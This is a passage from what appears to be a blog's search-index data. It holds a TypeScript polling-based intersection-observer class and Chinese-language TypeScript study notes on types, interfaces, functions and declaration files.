123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184const nextFrame = window.requestAnimationFrame || setTimeout;export class CustomEntry &#123; public isIntersecting: boolean; public target: Element; public constructor(options) &#123; this.isIntersecting = options.isIntersecting; this.target = options.target; &#125;&#125;interface CustomObserverOptions &#123; rootMargin?: String, root?: Element&#125;interface marginValueFormat &#123; value: number, unit: String&#125;interface Rect &#123; width: number, height: number, top: number, left: number, right: number, bottom: number&#125;export class CustomObserver &#123; private _targets: Set&lt;Element&gt;; private _entries: Map&lt;Element, CustomEntry&gt;; private _interval: number; private _isObserving: boolean; private _callback: (entries: Array&lt;CustomEntry&gt;) =&gt; void; private root: Element | null; private _rootMarginValues: Array&lt;marginValueFormat&gt; public constructor(callback, options: CustomObserverOptions = &#123;&#125;) &#123; this._targets = new Set(); this._entries = new Map(); this._interval = 150; this._isObserving = false; this._callback = callback; this.root = options.root || null; this._rootMarginValues = parseMargin(options.rootMargin); &#125; public observe(target: Element): void &#123; this._targets.add(target); this._startObservation(); &#125; public unobserve(target: Element): void &#123; this._targets.delete(target); this._entries.delete(target); &#125; public disconnect(): void &#123; this._targets.clear(); this._entries.clear(); &#125; public _startObservation(): any &#123; if (this._isObserving) &#123; return; &#125; this._isObserving = true; this._checkIntersection(); &#125; public _checkIntersection() &#123; nextFrame(() =&gt; &#123; const changedEntries: CustomEntry[] = []; const rootRect = expandRectByRootMargin(CustomObserver._getClientRect(this.root || document), this._rootMarginValues); for (const el of this._targets) &#123; const isDisplay = checkIsDisplay(el); const rect = el.getBoundingClientRect(); const intersectionRect = computeRectIntersection(rect, rootRect); const newEntry = new CustomEntry(&#123; target: el, isIntersecting: isDisplay &amp;&amp; !!intersectionRect, &#125;); const oldEntry = this._entries.get(el); if (!oldEntry || oldEntry.isIntersecting !== newEntry.isIntersecting) &#123; changedEntries.push(newEntry); &#125; this._entries.set(el, newEntry); &#125; if (changedEntries.length) &#123; this._callback(changedEntries); &#125; if (this._targets.size &gt; 0) &#123; setTimeout(() =&gt; this._checkIntersection(), this._interval); &#125; else &#123; this._isObserving = false; &#125; &#125;); &#125; static _getClientRect(el: any): Rect &#123; if (el === document) &#123; const html: Element = document.documentElement; const body: Element = document.body; return &#123; top: 0, left: 0, right: html.clientWidth || body.clientWidth, width: html.clientWidth || body.clientWidth, bottom: html.clientHeight || body.clientHeight, height: html.clientHeight || body.clientHeight, &#125;; &#125; try &#123; return el.getBoundingClientRect(); &#125; catch (e) &#123; return getEmptyRect(); &#125; &#125;&#125;function computeRectIntersection(rect1: Rect, rect2: Rect): boolean | Rect &#123; const top = Math.max(rect1.top, rect2.top); const bottom = Math.min(rect1.bottom, rect2.bottom); const left = Math.max(rect1.left, rect2.left); const right = Math.min(rect1.right, rect2.right); const width = right - left; const height = bottom - top; return width &gt;= 0 &amp;&amp; height &gt;= 0 &amp;&amp; &#123; top: top, bottom: bottom, left: left, right: right, width: width, height: height, &#125;;&#125;function parseMargin(margin: String | undefined): Array&lt;marginValueFormat&gt; &#123; const marginString = margin || '0px'; const margins = marginString.split(/\\s+/).map(function (margin) &#123; const parts = /^(-?\\d*\\.?\\d+)(px|%)$/.exec(margin); if (!parts) &#123; throw new Error('rootMargin must be specified in pixels or percent'); &#125; return &#123; value: parseFloat(parts[1]), unit: parts[2] &#125;; &#125;); // Handles shorthand. margins[1] = margins[1] || margins[0]; margins[2] = margins[2] || margins[0]; margins[3] = margins[3] || margins[1]; return margins;&#125;function expandRectByRootMargin(rect: Rect, rootMarginValues: Array&lt;marginValueFormat&gt;): Rect &#123; const margins = rootMarginValues.map(function (margin, i) &#123; return margin.unit === 'px' ? margin.value : margin.value * (i % 2 ? rect.width : rect.height) / 100; &#125;); const newRect: Rect = &#123; top: rect.top - margins[0], right: rect.right + margins[1], bottom: rect.bottom + margins[2], left: rect.left - margins[3], width:0, height:0 &#125;; newRect.width = newRect.right - newRect.left; newRect.height = newRect.bottom - newRect.top; return newRect;&#125;function checkIsDisplay(el: Element): boolean &#123; let ele: Element | null = el while (ele) &#123; if (el.nodeType === 1) &#123; if (getComputedStyle(el).display === 'none') &#123; return false; &#125; ele = ele.parentElement; &#125; &#125; return true;&#125;function getEmptyRect():Rect &#123; return &#123; top: 0, bottom: 0, left: 0, right: 0, width: 0, height: 0, &#125;;&#125;export default CustomObserver;","categories":[{"name":"技术","slug":"技术","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/"},{"name":"前端","slug":"技术/前端","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/"},{"name":"JavaScript","slug":"技术/前端/JavaScript","permalink":"https://wtaufpziv.github.io/categories/%E6%8A%80%E6%9C%AF/%E5%89%8D%E7%AB%AF/JavaScript/"}],"tags":[]},{"title":"typescript学习笔记","slug":"typescript学习笔记","date":"2020-06-26T16:00:00.000Z","updated":"2024-05-25T04:21:29.804Z","comments":true,"path":"2020/06/27/typescript学习笔记/","link":"","permalink":"https://wtaufpziv.github.io/2020/06/27/typescript%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"前言TypeScript 是 JavaScript 的类型的超集，它可以编译成纯 JavaScript。编译出来的 JavaScript 可以运行在任何浏览器上。TypeScript 编译工具可以运行在任何服务器和任何系统上。","text":"前言TypeScript 是 JavaScript 的类型的超集，它可以编译成纯 JavaScript。编译出来的 JavaScript 可以运行在任何浏览器上。TypeScript 编译工具可以运行在任何服务器和任何系统上。 typescript的优势 TypeScript 增加了代码的可读性和可维护性 类型系统实际上是最好的文档，大部分的函数看看类型的定义就可以知道如何使用了 可以在编译阶段就发现大部分错误，这总比在运行时候出错好 增强了编辑器和 IDE 的功能，包括代码补全、接口提示、跳转到定义、重构等 TypeScript 非常包容 TypeScript 是 JavaScript 的超集，.js 文件可以直接重命名为 .ts 即可 即使不显式的定义类型，也能够自动做出类型推论 可以定义从简单到复杂的几乎一切类型 即使 TypeScript 编译报错，也可以生成 JavaScript 文件 兼容第三方库，即使第三方库不是用 TypeScript 写的，也可以编写单独的类型文件供TypeScript 读取 TypeScript 拥有活跃的社区 大部分第三方库都有提供给 TypeScript 的类型定义文件 Google 开发的 Angular2 就是使用 TypeScript 编写的 TypeScript 拥抱了 ES6 规范，也支持部分 ESNext 草案的规范 安装TypeScript 的命令行工具安装方法如下： 1npm install -g typescript 以上命令会在全局环境下安装 tsc 命令，安装完成之后，我们就可以在任何地方执行 tsc 命令了。 编译一个 TypeScript 文件很简单： 1tsc hello.ts 我们约定使用 TypeScript 编写的文件以 .ts 为后缀，用 TypeScript 编写 React 时，以 .tsx 为后缀。 第一行ts代码复制以下代码到一个新建的ts文件当中： 123456function sayHello(person: string) &#123; return 'Hello, ' + person;&#125;let user = 'Tom';console.log(sayHello(user)); 然后执行 1tsc hello.ts 这时候会生成一个编译好的文件 hello.js： 12345function sayHello(person) &#123; return 'Hello, ' + person;&#125;var user = 'Tom';console.log(sayHello(user)); TypeScript 中，使用:指定变量的类型，:的前后有没有空格都可以。 上述例子中，我们用 :指定 person 参数类型为 string。但是编译为 js 之后，并没有什么检查的代码被插入进来。 TypeScript 只会进行静态检查，如果发现有错误，编译的时候就会报错。 let 是 ES6 中的关键字，和 var 类似，用于定义一个局部变量，可以参阅 let 和 const 命令。 下面尝试把这段代码编译一下： 123456function sayHello(person: string) &#123; return 'Hello, ' + person;&#125;let user = [0, 1, 2];console.log(sayHello(user)); 编辑器中会提示错误，编译的时候也会出错： index.ts(6,22): error TS2345: Argument of type ‘number[]’ is not assignable to parameter of type ‘string’. 但是还是生成了 js 文件： 12345function sayHello(person) &#123; return 'Hello, ' + person;&#125;var user = [0, 1, 2];console.log(sayHello(user)); TypeScript 编译的时候即使报错了，还是会生成编译结果，我们仍然可以使用这个编译之后的文件。 如果要在报错的时候终止 js 文件的生成，可以在 tsconfig.json 中配置 noEmitOnError 即可。关于 tsconfig.json，请参阅官方手册（中文版）。 语法基础为了让程序有价值，我们需要能够处理最简单的数据单元：数字，字符串，结构体，布尔值等。 TypeScript支持与JavaScript几乎相同的数据类型，此外还提供了实用的枚举类型方便我们使用。 布尔类型1let isDone: boolean = false; 数值类型和JavaScript一样，TypeScript里的所有数字都是浮点数。 这些浮点数的类型是number。 除了支持十进制和十六进制字面量，TypeScript还支持ECMAScript 2015中引入的二进制和八进制字面量。 1234let decLiteral: number = 6;let hexLiteral: number = 0xf00d;let binaryLiteral: number = 0b1010;let octalLiteral: number = 0o744; 字符串 像其它语言里一样，我们使用string表示文本数据类型。 和JavaScript一样，可以使用双引号（”）或单引号（’）表示字符串。 12let name: string = \"bob\";name = \"smith\"; 你还可以使用模版字符串，它可以定义多行文本和内嵌表达式。 这种字符串是被反引号1(&#96;)包围，并且以${ expr }这种形式嵌入表达式 123let name: string = `Gene`;let age: number = 37;let sentence: string = `Hello, my name is $&#123; name &#125;.I'll be $&#123; age + 1 &#125; years old next month.`; 这与下面定义sentence的方式效果相同： 12let sentence: string = \"Hello, my name is \" + name + \".\\n\\n\" + \"I'll be \" + (age + 1) + \" years old next month.\"; 数组TypeScript像JavaScript一样可以操作数组元素。 有两种方式可以定义数组。 第一种，可以在元素类型后面接上[]，表示由此类型元素组成的一个数组： 1let list: number[] = [1, 2, 3]; 第二种方式是使用数组泛型，Array&lt;元素类型&gt;： 1let list: Array&lt;number&gt; = [1, 2, 3]; 元组 Tuple元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同。 比如，你可以定义一对值分别为string和number类型的元组。 123456// Declare a tuple typelet x: [string, number];// Initialize itx = ['hello', 10]; // OK// Initialize it incorrectlyx = [10, 'hello']; // Error 当访问一个已知索引的元素，会得到正确的类型： 12console.log(x[0].substr(1)); // OKconsole.log(x[1].substr(1)); // Error, 'number' does not have 'substr' 当访问一个越界的元素，会使用联合类型替代： 123x[3] = 'world'; // OK, 字符串可以赋值给(string | number)类型console.log(x[5].toString()); // OK, 'string' 和 'number' 都有 toStringx[6] = true; // Error, 布尔不是(string | number)类型 联合类型是高级主题，我们会在以后的章节里讨论它。 枚举enum类型是对JavaScript标准数据类型的一个补充。 像C#等其它语言一样，使用枚举类型可以为一组数值赋予友好的名字。 12enum Color &#123;Red, Green, Blue&#125;let c: Color = Color.Green; 上述代码编译为JS之后是这样的： 1234567var Color;(function (Color) &#123; Color[Color[\"Red\"] = 0] = \"Red\"; Color[Color[\"Green\"] = 1] = \"Green\"; Color[Color[\"Blue\"] = 2] = \"Blue\";&#125;)(Color || (Color = &#123;&#125;));var c = Color.Green; 我们打印一下Color： 1&#123; '0': 'Red', '1': 'Green', '2': 'Blue', Red: 0, Green: 1, Blue: 2 &#125; 默认情况下，从0开始为元素编号。 你也可以手动的指定成员的数值。 例如，我们将上面的例子改成从1开始编号： 12enum Color &#123;Red = 1, Green, Blue&#125;let c: Color = Color.Green; 或者，全部都采用手动赋值： 12enum Color &#123;Red = 1, Green = 2, Blue = 4&#125;let c: Color = Color.Green; 枚举类型提供的一个便利是你可以由枚举的值得到它的名字。 例如，我们知道数值为2，但是不确定它映射到Color里的哪个名字，我们可以查找相应的名字： 123enum Color &#123;Red = 1, Green, Blue&#125;let colorName: string = Color[2];console.log(colorName); 任意值有时候，我们会想要为那些在编程阶段还不清楚类型的变量指定一个类型。 这些值可能来自于动态的内容，比如来自用户输入或第三方代码库。 这种情况下，我们不希望类型检查器对这些值进行检查而是直接让它们通过编译阶段的检查。 那么我们可以使用any类型来标记这些变量： 123let notSure: any = 4;notSure = \"maybe a string instead\";notSure = false; // okay, definitely a boolean 在对现有代码进行改写的时候，any类型是十分有用的，它允许你在编译时可选择地包含或移除类型检查。 你可能认为Object有相似的作用，就像它在其它语言中那样。 但是Object类型的变量只是允许你给它赋任意值 - 但是却不能够在它上面调用任意的方法，即便它真的有这些方法： 123456let notSure: any = 4;notSure.ifItExists(); // okay, ifItExists might exist at runtimenotSure.toFixed(); // okay, toFixed exists (but the compiler doesn't check)let prettySure: Object = 4;prettySure.toFixed(); // Error: Property 'toFixed' doesn't exist on type 'Object'. 当你只知道一部分数据的类型时，any类型也是有用的。 比如，你有一个数组，它包含了不同的类型的数据： 123let list: any[] = [1, true, \"free\"];list[1] = 100; 空值某种程度上来说，void类型像是与any类型相反，它表示没有任何类型。 当一个函数没有返回值时，你通常会见到其返回值类型是void： 123function warnUser(): void &#123; console.log(\"This is my warning message\");&#125; 声明一个void类型的变量没有什么大用，因为你只能为它赋予undefined和null： 1let unusable: void = undefined 对象的类型——接口在 TypeScript 中，我们使用接口（Interfaces）来定义对象的类型。 什么是接口：在面向对象语言中，接口（Interfaces）是一个很重要的概念，它是对行为的抽象，而具体如何行动需要由类（classes）去实现（implement）。 TypeScript 中的接口是一个非常灵活的概念，除了可用于对类的一部分行为进行抽象以外，也常用于对「对象的形状（Shape）」进行描述。 简单的例子： 123456789interface Person &#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25&#125;; 上面的例子中，我们定义了一个接口 Person，接着定义了一个变量 tom，它的类型是 Person。这样，我们就约束了 tom 的形状必须和接口 Person 一致。 接口一般首字母大写。有的编程语言中会建议接口的名称加上I前缀。 定义的变量比接口少了一些属性是不允许的： 1234567891011interface Person &#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom'&#125;;// index.ts(6,5): error TS2322: Type '&#123; name: string; &#125;' is not assignable to type 'Person'.// Property 'age' is missing in type '&#123; name: string; &#125;'. 多一些属性也是不允许的： 12345678910111213interface Person &#123; name: string; age: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male'&#125;;// index.ts(9,5): error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Object literal may only specify known properties, and 'gender' does not exist in type 'Person'. 可见，赋值的时候，变量的形状必须和接口的形状保持一致。 可选属性：有时我们希望不要完全匹配一个形状，那么可以用可选属性： 1234567891011121314151617interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom'&#125;;interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25&#125;; 可选属性的含义是该属性可以不存在。 这时仍然不允许添加未定义的属性： 12345678910111213interface Person &#123; name: string; age?: number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male'&#125;;// examples/playground/index.ts(9,5): error TS2322: Type '&#123; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Object literal may only specify known properties, and 'gender' does not exist in type 'Person'. 任意属性：有时候我们希望一个接口允许有任意的属性，可以使用如下方式： 12345678910interface Person &#123; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: 'Tom', gender: 'male'&#125;; 使用 [propName: string] 定义了任意属性取 string 类型的值。 需要注意的是，一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集： 1234567891011121314151617interface Person &#123; name: string; age?: number; [propName: string]: string;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male'&#125;;// index.ts(3,5): error TS2411: Property 'age' of type 'number' is not assignable to string index type 'string'.// index.ts(7,5): error TS2322: Type '&#123; [x: string]: string | number; name: string; age: number; gender: string; &#125;' is not assignable to type 'Person'.// Index signatures are incompatible.// Type 'string | number' is not assignable to type 'string'.// Type 'number' is not assignable to type 'string'. 上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。 另外，在报错信息中可以看出，此时 { name: ‘Tom’, age: 25, gender: ‘male’ } 的类型被推断成了 { [x: string]: string | number; name: string; age: number; gender: string; }，这是联合类型和接口的结合。 一个接口中只能定义一个任意属性。如果接口中有多个类型的属性，则可以在任意属性中使用联合类型： 1234567891011interface Person &#123; name: string; age?: number; [propName: string]: string | number;&#125;let tom: Person = &#123; name: 'Tom', age: 25, gender: 'male'&#125;; 只读属性：有时候我们希望对象中的一些字段只能在创建的时候被赋值，那么可以用 readonly 定义只读属性： 12345678910111213141516interface Person &#123; readonly id: number; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; id: 89757, name: 'Tom', gender: 'male'&#125;;tom.id = 9527;// index.ts(14,5): error TS2540: Cannot assign to 'id' because it is a constant or a read-only property. 上例中，使用 readonly 定义的属性 id 初始化后，又被赋值了，所以报错了。 注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候，只读属性不能是可选属性，初始化的时候必须带有该属性 1234567891011121314151617interface Person &#123; readonly id: number; name: string; age?: number; [propName: string]: any;&#125;let tom: Person = &#123; name: 'Tom', gender: 'male'&#125;;tom.id = 89757;// index.ts(8,5): error TS2322: Type '&#123; name: string; gender: string; &#125;' is not assignable to type 'Person'.// Property 'id' is missing in type '&#123; name: string; gender: string; &#125;'.// index.ts(13,5): error TS2540: Cannot assign to 'id' because it is a constant or a read-only property. 上例中，报错信息有两处，第一处是在对 tom 进行赋值的时候，没有给 id 赋值。 第二处是在给 tom.id 赋值的时候，由于它是只读属性，所以报错了。 函数 一句闲话：函数是JS中的一等公民 函数声明：众所周知，在 JavaScript 中，有两种常见的定义函数的方式——函数声明（Function Declaration）和函数表达式（Function Expression）： 123456789// 函数声明（Function Declaration）function sum(x, y) &#123; return x + y;&#125;// 函数表达式（Function Expression）let mySum = function (x, y) &#123; return x + y;&#125;; 一个函数有输入和输出，要在 TypeScript 中对其进行约束，需要把输入和输出都考虑到，其中函数声明的类型定义较简单： 123function sum(x: number, y: number): number &#123; return x + y;&#125; 注意，输入多余的（或者少于要求的）参数，是不被允许的： 123456789101112function sum(x: number, y: number): number &#123; return x + y;&#125;sum(1, 2, 3);// index.ts(4,1): error TS2346: Supplied parameters do not match any signature of call target.function sum(x: number, y: number): number &#123; return x + y;&#125;sum(1);// index.ts(4,1): error TS2346: Supplied parameters do not match any signature of call target. 函数表达式：如果要我们现在写一个对函数表达式（Function Expression）的定义，可能会写成这样： 123let mySum = function (x: number, y: number): number &#123; return x + y;&#125;; 这是可以通过编译的，不过事实上，上面的代码只对等号右侧的匿名函数进行了类型定义，而等号左边的 mySum，是通过赋值操作进行类型推论而推断出来的。如果需要我们手动给 mySum 添加类型，则应该是这样： 123let mySum: (x: number, y: number) =&gt; number = function (x: number, y: number): number &#123; return x + y;&#125;; 注意不要混淆了 TypeScript 中的 =&gt;和 ES6 中的 =&gt;。 在 TypeScript 的类型定义中，=&gt;用来表示函数的定义，左边是输入类型，需要用括号括起来，右边是输出类型。 在 ES6 中，=&gt;叫做箭头函数，应用十分广泛，可以参考 ES6 中的箭头函数。 用接口定义函数的形状：我们也可以使用接口的方式来定义一个函数需要符合的形状： 12345678interface SearchFunc &#123; (source: string, subString: string): boolean;&#125;let mySearch: SearchFunc;mySearch = function(source: string, subString: string) &#123; return source.search(subString) !== -1;&#125; 采用函数表达式|接口定义函数的方式时，对等号左侧进行类型限制，可以保证以后对函数名赋值时保证参数个数、参数类型、返回值类型不变。 可选参数：前面提到，输入多余的（或者少于要求的）参数，是不允许的。那么如何定义可选的参数呢？ 与接口中的可选属性类似，我们用 ? 表示可选的参数： 123456789function buildName(firstName: string, lastName?: string) &#123; if (lastName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return firstName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName('Tom'); 需要注意的是，可选参数必须接在必需参数后面。换句话说，可选参数后面不允许再出现必需参数了： 1234567891011function buildName(firstName?: string, lastName: string) &#123; if (firstName) &#123; return firstName + ' ' + lastName; &#125; else &#123; return lastName; &#125;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName(undefined, 'Tom');// index.ts(1,40): error TS1016: A required parameter cannot follow an optional parameter. 参数默认值：在 ES6 中，我们允许给函数的参数添加默认值，TypeScript 会将添加了默认值的参数识别为可选参数： 12345function buildName(firstName: string, lastName: string = 'Cat') &#123; return firstName + ' ' + lastName;&#125;let tomcat = buildName('Tom', 'Cat');let tom = buildName('Tom'); 此时就不受「可选参数必须接在必需参数后面」的限制了： 12345function buildName(firstName: string = 'Tom', lastName: string) &#123; return firstName + ' ' + lastName;&#125;let tomcat = buildName('Tom', 'Cat');let cat = buildName(undefined, 'Cat'); 关于默认参数，可以参考 ES6 中函数参数的默认值。 剩余参数：ES6 中，可以使用 …rest 的方式获取函数中的剩余参数（rest 参数）： 12345678function push(array, ...items) &#123; items.forEach(function(item) &#123; array.push(item); &#125;);&#125;let a: any[] = [];push(a, 1, 2, 3); 事实上，items 是一个数组。所以我们可以用数组的类型来定义它： 12345678function push(array: any[], ...items: any[]) &#123; items.forEach(function(item) &#123; array.push(item); &#125;);&#125;let a = [];push(a, 1, 2, 3); 注意，rest 参数只能是最后一个参数，关于 rest 参数，可以参考 ES6 中的 rest 参数。 重载：重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。 比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 ‘hello’ 的时候，输出反转的字符串 ‘olleh’。 利用联合类型，我们可以这么实现： 1234567function reverse(x: number | string): number | string &#123; if (typeof x === 'number') &#123; return Number(x.toString().split('').reverse().join('')); &#125; else if (typeof x === 'string') &#123; return x.split('').reverse().join(''); &#125;&#125; 然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串。 这时，我们可以使用重载定义多个 reverse 的函数类型： 123456789function reverse(x: number): number;function reverse(x: string): string;function reverse(x: number | string): number | string &#123; if (typeof x === 'number') &#123; return Number(x.toString().split('').reverse().join('')); &#125; else if (typeof x === 'string') &#123; return x.split('').reverse().join(''); &#125;&#125; 上例中，我们重复定义了多次函数 reverse，前几次都是函数定义，最后一次是函数实现。在编辑器的代码提示中，可以正确的看到前两个提示。 注意，TypeScript 会优先从最前面的函数定义开始匹配，所以多个函数定义如果有包含关系，需要优先把精确的定义写在前面。 类型推断以下代码虽然没有指定类型，但是会在编译的时候报错： 1234let myFavoriteNumber = 'seven';myFavoriteNumber = 7;// index.ts(2,1): error TS2322: Type 'number' is not assignable to type 'string'. 事实上，它等价于： 1234let myFavoriteNumber: string = 'seven';myFavoriteNumber = 7;// index.ts(2,1): error TS2322: Type 'number' is not assignable to type 'string'. TypeScript 会在没有明确的指定类型的时候推测出一个类型，这就是类型推论。 如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查： 123let myFavoriteNumber;myFavoriteNumber = 'seven';myFavoriteNumber = 7; 类型断言有时候你会遇到这样的情况，你会比TypeScript更了解某个值的详细信息。 通常这会发生在你清楚地知道一个实体具有比它现有类型更确切的类型。通过类型断言这种方式可以告诉编译器，“相信我，我知道自己在干什么”。 类型断言好比其它语言里的类型转换，但是不进行特殊的数据检查和解构。 它没有运行时的影响，只是在编译阶段起作用。 TypeScript会假设你，程序员，已经进行了必须的检查。类型断言有两种形式。 其一是“尖括号”语法： 123let someValue: any = \"this is a string\";let strLength: number = (&lt;string&gt;someValue).length; 另一个为as语法： 123let someValue: any = \"this is a string\";let strLength: number = (someValue as string).length; 两种形式是等价的。 至于使用哪个大多数情况下是凭个人喜好；然而，当你在TypeScript里使用JSX时，只有as语法断言是被允许的。 联合类型联合类型（Union Types）表示取值可以为多种类型中的一种。 简单的例子： 12345678let myFavoriteNumber: string | number;myFavoriteNumber = 'seven';myFavoriteNumber = 7;let myFavoriteNumber: string | number;myFavoriteNumber = true;// index.ts(2,1): error TS2322: Type 'boolean' is not assignable to type 'string | number'.// Type 'boolean' is not assignable to type 'number'. 联合类型使用|分隔每个类型。 这里的 let myFavoriteNumber: string | number的含义是，允许 myFavoriteNumber 的类型是 string 或者 number，但是不能是其他类型。 访问联合类型的属性或方法§当 TypeScript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型里共有的属性或方法： 123456function getLength(something: string | number): number &#123; return something.length;&#125;// index.ts(2,22): error TS2339: Property 'length' does not exist on type 'string | number'.// Property 'length' does not exist on type 'number'. 上例中，length 不是 string 和 number 的共有属性，所以会报错。 访问 string 和 number 的共有属性是没问题的： 123function getString(something: string | number): string &#123; return something.toString();&#125; 联合类型的变量在被赋值的时候，会根据类型推论的规则推断出一个类型： 1234567let myFavoriteNumber: string | number;myFavoriteNumber = 'seven';console.log(myFavoriteNumber.length); // 5myFavoriteNumber = 7;console.log(myFavoriteNumber.length); // 编译时报错// index.ts(5,30): error TS2339: Property 'length' does not exist on type 'number'. 上例中，第二行的 myFavoriteNumber 被推断成了 string，访问它的 length 属性不会报错。 而第四行的 myFavoriteNumber 被推断成了 number，访问它的 length 属性时就报错了。 Null 和 UndefinedTypeScript里，undefined和null两者各自有自己的类型分别叫做undefined和null。 和void相似，它们的本身的类型用处不是很大： 123// Not much else we can assign to these variables!let u: undefined = undefined;let n: null = null; 默认情况下null和undefined是所有类型的子类型。 就是说你可以把null和undefined赋值给number类型的变量。然而，当你指定了–strictNullChecks标记，null和undefined只能赋值给void和它们各自。 这能避免很多常见的问题。 也许在某处你想传入一个string或null或undefined，你可以使用联合类型string | null | undefined。 注意：我们鼓励尽可能地使用–strictNullChecks Nevernever类型表示的是那些永不存在的值的类型。 例如，never类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型； 变量也可能是never类型，当它们被永不为真的类型保护所约束时。 never类型是任何类型的子类型，也可以赋值给任何类型；然而，没有类型是never的子类型或可以赋值给never类型（除了never本身之外）。 即使any也不可以赋值给never。下面是一些返回never类型的函数： 123456789101112131415function error(message: string): never &#123; throw new Error(message);&#125;// 推断的返回值类型为neverfunction fail() &#123; return error(\"Something failed\");&#125;// 返回never的函数必须存在无法达到的终点function infiniteLoop(): never &#123; while (true) &#123; &#125;&#125; 声明文件当使用第三方库时，我们需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能。 declare var 声明全局变量 declare function 声明全局方法 declare class 声明全局类 declare enum 声明全局枚举类型 declare namespace 声明（含有子属性的）全局对象 interface 和 type 声明全局类型 export 导出变量 export namespace 导出（含有子属性的）对象 export default ES6 默认导出 export = commonjs 导出模块 export as namespace UMD 库声明全局变量 declare global 扩展全局变量 declare module 扩展模块 /// &lt;reference /&gt; 三斜线指令 什么是声明语句假如我们想使用第三方库 jQuery，一种常见的方式是在 html 中通过&lt;script&gt;标签引入 jQuery，然后就可以使用全局变量$或 jQuery 了。 我们通常这样获取一个 id 是 foo 的元素： 123$('#foo');// orjQuery('#foo'); 但是在 ts 中，编译器并不知道 $或 jQuery 是什么东西1： 12jQuery('#foo');// ERROR: Cannot find name 'jQuery'. 这时，我们需要使用 declare var 来定义它的类型2： 123declare var jQuery: (selector: string) =&gt; any;jQuery('#foo'); 上例中，declare var 并没有真的定义一个变量，只是定义了全局变量 jQuery 的类型，仅仅会用于编译时的检查，在编译结果中会被删除。它编译结果是： 1jQuery('#foo'); 除了 declare var 之外，还有其他很多种声明语句，将会在后面详细介绍。 什么是声明文件通常我们会把声明语句放到一个单独的文件（jQuery.d.ts）中，这就是声明文件3： 123456// src/jQuery.d.tsdeclare var jQuery: (selector: string) =&gt; any;// src/index.tsjQuery('#foo'); 声明文件必需以 .d.ts 为后缀。 一般来说，ts 会解析项目中所有的*.ts文件，当然也包含以.d.ts结尾的文件。所以当我们将jQuery.d.ts放到项目中时，其他所有 *.ts文件就都可以获得 jQuery 的类型定义了。 假如仍然无法解析，那么可以检查下 tsconfig.json 中的 files、include 和 exclude 配置，确保其包含了 jQuery.d.ts 文件。 这里只演示了全局变量这种模式的声明文件，假如是通过模块导入的方式使用第三方库的话，那么引入声明文件又是另一种方式了，将会在后面详细介绍。 书写声明文件当一个第三方库没有提供声明文件时，我们就需要自己书写声明文件了。前面只介绍了最简单的声明文件内容，而真正书写一个声明文件并不是一件简单的事，以下会详细介绍如何书写声明文件。 在不同的场景下，声明文件的内容和使用方式会有所区别。 库的使用场景主要有以下几种： 全局变量：通过&lt;script&gt;标签引入第三方库，注入全局变量 npm 包：通过import foo from &#39;foo&#39;导入，符合 ES6 模块规范 UMD 库：既可以通过&lt;script&gt;标签引入，又可以通过import导入 直接扩展全局变量：通过&lt;script&gt;标签引入后，改变一个全局变量的结构 在 npm 包或 UMD 库中扩展全局变量：引用 npm 包或 UMD 库后，改变一个全局变量的结构 模块插件：通过&lt;script&gt;或 import导入后，改变另一个模块的结构 全局变量全局变量是最简单的一种场景，之前举的例子就是通过&lt;script&gt;标签引入 jQuery，注入全局变量 $和 jQuery。 使用全局变量的声明文件时，如果是以 npm install @types/xxx --save-dev安装的，则不需要任何配置。如果是将声明文件直接存放于当前项目中，则建议和其他源码一起放到 src 目录下（或者对应的源码目录下）： 如果没有生效，可以检查下 tsconfig.json 中的 files、include 和 exclude 配置，确保其包含了 jQuery.d.ts 文件。 全局变量的声明文件主要有以下几种语法： declare var 声明全局变量 declare function 声明全局方法 declare class 声明全局类 declare enum 声明全局枚举类型 declare namespace 声明（含有子属性的）全局对象 interface 和 type 声明全局类型 declare var/let/const在所有的声明语句中，declare var 是最简单的，如之前所学，它能够用来定义一个全局变量的类型。与其类似的，还有 declare let 和 declare const，使用 let 与使用 var 没有什么区别： 123456789// src/jQuery.d.tsdeclare let jQuery: (selector: string) =&gt; any;// src/index.tsjQuery('#foo');// 使用 declare let 定义的 jQuery 类型，允许修改这个全局变量jQuery = function(selector) &#123; return document.querySelector(selector);&#125;; 而当我们使用 const 定义时，表示此时的全局变量是一个常量，不允许再去修改它的值了4： 12345678// src/jQuery.d.tsdeclare const jQuery: (selector: string) =&gt; any;jQuery('#foo');// 使用 declare const 定义的 jQuery 